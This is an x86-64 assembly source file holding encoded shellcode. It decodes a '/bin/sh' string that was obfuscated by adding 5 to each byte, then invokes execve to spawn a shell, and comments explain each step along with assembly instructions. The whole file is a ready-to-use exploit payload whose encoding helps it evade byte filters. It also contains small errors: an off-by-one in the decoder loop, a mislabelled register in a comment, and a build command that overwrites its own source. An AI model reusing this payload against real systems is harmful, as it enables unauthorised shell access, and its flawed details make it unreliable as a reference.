; opens shell, decodes '/bin/sh0x00' encoded by adding 5 to each byte
; assemble and run: $ nasm -f elf64 -o <name>.asm && ld <name>.o && ./a.out

section .text 
    global _start

_start: 
    ; syntax: int execve(const char *filename, char *const argv[], char *const envp[])
    mov rax, 0x056d7834736e6734 
    push rax                 ; push '/bin/sh\x00', each byte encoded + 5
    mov rdi, rsp             ; rdi (arg1) = ptr to encoded '/bin/sh\x00'

    push byte 0x8  
    pop rsi                  ; num of bytes in '/bin/sh\x00'

decoder_loop: 
    sub byte [rdi+rsi], 0x5  ; subtract 5 from byte at rdi+rax
    dec rsi                  ; move to next byte
    jns decoder_loop         ; call loop again if more bytes to be decoded 

    xor rsi, rsi             ; rsi (arg2) = 0
    xor rdx, rdx             ; rdx (arg3) = 0 
    push byte 0x3b
    pop rax                  ; (rax): execve syscall num (59)
    syscall
